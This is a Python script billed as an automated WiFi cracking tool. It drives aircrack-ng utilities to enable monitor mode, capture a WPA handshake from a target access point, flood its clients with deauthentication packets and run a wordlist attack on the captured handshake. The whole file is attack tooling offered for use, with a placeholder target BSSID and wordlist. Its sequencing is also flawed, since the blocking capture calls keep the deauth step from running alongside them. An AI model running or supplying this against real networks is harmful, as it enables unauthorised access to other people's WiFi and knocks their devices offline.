import subprocess
import pyfiglet

def print_banner():
    banner = pyfiglet.figlet_format("WiFi Cracker")
    print(banner)
    print("Automated WiFi Cracking Tool")

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            print(result.stdout)
        else:
            print("Error:\n", result.stderr)
    except Exception as e:
        print(f"An error occurred: {e}")

def enable_monitor_mode(interface):
    print(f"Enabling monitor mode on {interface}...")
    run_command(f"sudo airmon-ng start {interface}")

def disable_monitor_mode(interface):
    print(f"Disabling monitor mode on {interface}...")
    run_command(f"sudo airmon-ng stop {interface}")

def scan_networks(interface):
    print("Scanning for networks...")
    run_command(f"sudo airodump-ng {interface}")

def capture_handshake(interface, bssid, channel, output_file):
    print(f"Capturing handshake on {interface} for BSSID {bssid} on channel {channel}...")
    run_command(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {interface}")

def deauthenticate_clients(interface, bssid):
    print(f"Deauthenticating clients on {interface} for BSSID {bssid}...")
    run_command(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}")

def crack_wpa_handshake(wordlist, capture_file):
    print("Cracking the WPA handshake...")
    run_command(f"aircrack-ng -w {wordlist} {capture_file}")

if __name__ == "__main__":
    print_banner()

    # Interface and file paths
    interface = "wlan0"  # Replace with your wireless interface
    bssid = "00:11:22:33:44:55"  # Replace with the target BSSID
    channel = 6  # Replace with the target channel
    output_file = "handshake"
    wordlist_path = "path/to/wordlist.txt"  # Replace with your wordlist path

    enable_monitor_mode(interface)
    
    try:
        scan_networks(interface)
        capture_handshake(interface, bssid, channel, output_file)
        deauthenticate_clients(interface, bssid)
        crack_wpa_handshake(wordlist_path, output_file + "-01.cap")
    finally:
        disable_monitor_mode(interface)
